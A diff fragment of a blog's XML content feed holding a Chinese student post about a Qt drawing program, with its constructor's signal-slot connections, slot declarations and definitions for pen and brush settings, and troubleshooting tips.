+<h3 id="四、构造函数"><a href="#四、构造函数" class="headerlink" title="四、构造函数"></a>四、构造函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paint::paint(QWidget *parent) :</span><br><span class="line">    QMainWindow(parent),</span><br><span class="line">    ui(new Ui::paint)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;setupUi(this);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;设置画布</span><br><span class="line">    pix&#x3D;new QPixmap(this-&gt;size()*5);</span><br><span class="line">    pix-&gt;fill(Qt::white);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;设置初使属性</span><br><span class="line">    brush.setColor(Qt::NoBrush);</span><br><span class="line">    status&#x3D;1;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;连接信号和槽</span><br><span class="line">    connect(ui-&gt;line,SIGNAL(triggered(bool)),this,SLOT(status_line()));</span><br><span class="line">    connect(ui-&gt;rect,SIGNAL(triggered(bool)),this,SLOT(status_rect()));</span><br><span class="line">    connect(ui-&gt;ellipse,SIGNAL(triggered(bool)),this,SLOT(status_ellipse()));</span><br><span class="line">    connect(ui-&gt;actionfree,SIGNAL(triggered(bool)),this,SLOT(status_free()));</span><br><span class="line">    connect(ui-&gt;actionred,SIGNAL(triggered(bool)),this,SLOT(change_color_red()));</span><br><span class="line">    connect(ui-&gt;actionblue,SIGNAL(triggered(bool)),this,SLOT(change_color_blue()));</span><br><span class="line">    connect(ui-&gt;actiongreen,SIGNAL(triggered(bool)),this,SLOT(change_color_green()));</span><br><span class="line">    connect(ui-&gt;actionblack,SIGNAL(triggered(bool)),this,SLOT(change_color_black()));</span><br><span class="line">    connect(ui-&gt;action2,SIGNAL(triggered(bool)),this,SLOT(penwidth2()));</span><br><span class="line">    connect(ui-&gt;action5,SIGNAL(triggered(bool)),this,SLOT(penwidth5()));</span><br><span class="line">    connect(ui-&gt;action8,SIGNAL(triggered(bool)),this,SLOT(penwidth8()));</span><br><span class="line">    connect(ui-&gt;action10,SIGNAL(triggered(bool)),this,SLOT(penwidth10()));</span><br><span class="line">    connect(ui-&gt;solid_line,SIGNAL(triggered(bool)),this,SLOT(set_solid()));</span><br><span class="line">    connect(ui-&gt;dash_line,SIGNAL(triggered(bool)),this,SLOT(set_dash()));</span><br><span class="line">    connect(ui-&gt;dash_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdot()));</span><br><span class="line">    connect(ui-&gt;dash_dot_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdotdot()));</span><br><span class="line">    connect(ui-&gt;dot_line,SIGNAL(triggered(bool)),this,SLOT(set_dot()));</span><br><span class="line">    connect(ui-&gt;fred,SIGNAL(triggered(bool)),this,SLOT(set_fill_red()));</span><br><span class="line">    connect(ui-&gt;fblue,SIGNAL(triggered(bool)),this,SLOT(set_fill_blue()));</span><br><span class="line">    connect(ui-&gt;fblack,SIGNAL(triggered(bool)),this,SLOT(set_fill_black()));</span><br><span class="line">    connect(ui-&gt;fgreen,SIGNAL(triggered(bool)),this,SLOT(set_fill_green()));</span><br><span class="line">    connect(ui-&gt;solid_pattern,SIGNAL(triggered(bool)),this,SLOT(set_solid_pattern()));</span><br><span class="line">    connect(ui-&gt;dense_pattern,SIGNAL(triggered(bool)),this,SLOT(set_dense_pattern()));</span><br><span class="line">    connect(ui-&gt;none,SIGNAL(triggered(bool)),this,SLOT(set_none_pattern()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="遇到的问题和解决方法：-1"><a href="#遇到的问题和解决方法：-1" class="headerlink" title="遇到的问题和解决方法："></a>遇到的问题和解决方法：</h4><ul>
+<li>可以获得鼠标事件坐标，但无法绘制，解决方法：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pix&#x3D;new QPixmap(this-&gt;size()*5);&#x2F;&#x2F;结构函数</span><br><span class="line">QPainter *painter&#x3D;new QPainter(pix);&#x2F;&#x2F;绘制函数</span><br></pre></td></tr></table></figure></li>
+<li>点击menubar中label发出的信号槽函数无法接收到：<br>原connect写法：<br><code>connect(ui-&gt;line,SIGNAL(clicked()),this,SLOT(status_line()));</code><br>将<code>clicked()</code>改为<code>triggered(bool)</code>即可</li>
+</ul>
+<hr>
+<h3 id="五、槽函数："><a href="#五、槽函数：" class="headerlink" title="五、槽函数："></a>五、槽函数：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public slots:</span><br><span class="line">    &#x2F;&#x2F;设置绘制形状</span><br><span class="line">    void status_line();</span><br><span class="line">    void status_rect();</span><br><span class="line">    void status_ellipse();</span><br><span class="line">    void status_free();&#x2F;&#x2F;绘制鼠标轨迹</span><br><span class="line">    &#x2F;&#x2F;设置线条颜色</span><br><span class="line">    void change_color_blue();</span><br><span class="line">    void change_color_red();</span><br><span class="line">    void change_color_green();</span><br><span class="line">    void change_color_black();</span><br><span class="line">    &#x2F;&#x2F;设置线条宽度</span><br><span class="line">    void penwidth2();</span><br><span class="line">    void penwidth5();</span><br><span class="line">    void penwidth8();</span><br><span class="line">    void penwidth10();</span><br><span class="line">    &#x2F;&#x2F;设置线条样式</span><br><span class="line">    void set_solid();</span><br><span class="line">    void set_dash();</span><br><span class="line">    void set_dot();</span><br><span class="line">    void set_dashdot();</span><br><span class="line">    void set_dashdotdot();</span><br><span class="line">    &#x2F;&#x2F;设置填充颜色</span><br><span class="line">    void set_fill_red();</span><br><span class="line">    void set_fill_blue();</span><br><span class="line">    void set_fill_green();</span><br><span class="line">    void set_fill_black();</span><br><span class="line">    &#x2F;&#x2F;设置填充样式</span><br><span class="line">    void set_solid_pattern();</span><br><span class="line">    void set_dense_pattern();</span><br><span class="line">    void set_none_pattern();</span><br></pre></td></tr></table></figure>
+<h4 id="槽函数定义示例："><a href="#槽函数定义示例：" class="headerlink" title="槽函数定义示例："></a>槽函数定义示例：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::status_line()</span><br><span class="line">&#123;</span><br><span class="line">    status&#x3D;1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::change_color_red()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setColor(Qt::red);</span><br><span class="line">    &#x2F;&#x2F;注意书写格式，不可以写为pen.setColor(&quot;red&quot;);否则无法传入颜色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::penwidth5()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setWidth(5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_dash()</span><br><span class="line">&#123;</span><br><span class="line">    pen.setStyle(Qt::DashLine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_fill_blue()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setColor(Qt::blue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_dense_pattern()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setStyle(Qt::Dense7Pattern);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void paint::set_none_pattern()</span><br><span class="line">&#123;</span><br><span class="line">    brush.setStyle(Qt::NoBrush);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="遇到的问题和解决方法"><a href="#遇到的问题和解决方法" class="headerlink" title="遇到的问题和解决方法"></a>遇到的问题和解决方法</h4><ul>
+<li>信号和槽函数无法连接：<ul>
+<li>检查信号和发送信号的来源是否对应</li>
+<li>检查信号和槽的拼写是否准确</li>
+<li>利用qDebug()进行调试</li>
+</ul>
+</li>
+<li>brush必须设置填充样式，否则无法填充</li>
+</ul>
+<hr>
+<h3 id="六、成果展示"><a href="#六、成果展示" class="headerlink" title="六、成果展示"></a>六、成果展示</h3><p><img src="/img/loading.gif" class="lazyload" data-src="http://static.zybuluo.com/LittleFairyDoesntLoseHair/v86upj0wwx905xyzftjgvh3j/image_1df8akslg1oo5li7b5jp314rb16.png"  alt="image_1df8akslg1oo5li7b5jp314rb16.png-79.6kB"></p>
+]]></content>
+      <categories>
+        <category>Qt</category>
+      </categories>
+      <tags>
+        <tag>Qt</tag>
+        <tag>大一</tag>
+        <tag>作业</tag>
       </tags>
   </entry>
   <entry>
